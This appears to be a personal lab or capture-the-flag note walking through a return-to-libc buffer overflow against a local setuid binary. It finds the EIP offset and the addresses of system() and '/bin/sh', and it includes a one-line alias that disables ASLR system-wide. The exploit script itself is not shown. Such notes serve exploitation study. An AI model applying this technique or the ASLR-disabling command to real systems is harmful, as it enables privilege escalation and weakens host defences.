Return to lib-c  : making use of dynamically linked

secureserver: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ba7b32f02b9ce5948bcb57c33599de4ad17682de, for GNU/Linux 3.2.0, not stripped

    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)


NX is enabled so we cannot execute shellcode, must have been compiled withou -z execstack

# sudo chown root:root secureserver
# sudo chown root:root flag.txt
# sudo chmod 4655 secureserver
# sudo chmod 600 flag.txt

this time the code that we inject into the stack wont be executed

dynamically linked, so calling libraries stored in our computer

**********
lib-c has functions like gets,puts,system and strings like /bin/sh so if we were able to access those functions in lib-c ,so even though there is nothing interesting in this program , we can return to lib-c library and start executing functions there and in doing that we can hopefully get a shell
**********

#cyclic 100
*ESP  0xffeeec50 ◂— 'uaaavaaawaaaxaaayaaa'
*EIP  0x61616174 ('taaa')

# cyclic -l taaa
Found at offset 76

We will overwrite the EIP with 77,78,79 and 80th byte that we send

*************
Overwrite EIP with the address of lib-c library system function and the parameter we want to pass to the system function is /bin/sh
inside pwndbg

# search -t string "/bin/sh"
libc.so.6       0xf7db5fc8 '/bin/sh'

to get base address of lib-c

#ldd secureserver
	linux-gate.so.1 (0xf7edf000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7c00000)
	/lib/ld-linux.so.2 (0xf7ee1000)
address of lib-c library = 0xf7c00000
the problem is that, each time we do that, we get a different address, This is ASLR : Address Space Layout Randomization meaning a binary will have different base address to prevent bufferoverflow attack

To disable aslr, we will make an alias cmd to make it easy as well
# alias alsr_off='echo 0 | sudo tee /proc/sys/kernel/randomize_va_space'
now if we do
#ldd secureserver, everytime it has got the same base address
*************

next we need to find out where is system function

# readelf -s /lib/i386-linux-gnu/libc.so.6
/lib/i386-linux-gnu/libc.so.6 : we got this name from ldd

# readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
  1119: 0004c880    55 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.0
We get the offset of system function

*******
Important to find base of libraries, we can then find offset of functions easily
If a remote server leaks some address of library we can use it 
*******

To find offset of /bin/sh in lib-c

# strings /lib/i386-linux-gnu/libc.so.6 -a -t x | grep "/bin/sh"
Put /bin/sh inside "" or else it will execute it

-t : type
x : output as type of hex

1b5fc8 /bin/sh : this is the offset of this string

1 ) from ldd find base address of lib-c
2 ) from readelf find offset for system function
3 ) from strings of lib-c find offset of string "/bin/sh"

./myExploit.py
#id
and we are root and now ca read the flag

If address leaked, go into gdb and 
# x hexAddress leaked

in this case
[*] system: 0xf7c4c880
[*] binsh: 0xf7db5fc8

# x 0xf7c4c880
0xf7c4c880 <__libc_system>:	0x121f24e8

If we wanted to find base of the binary, we can subtract it to find out












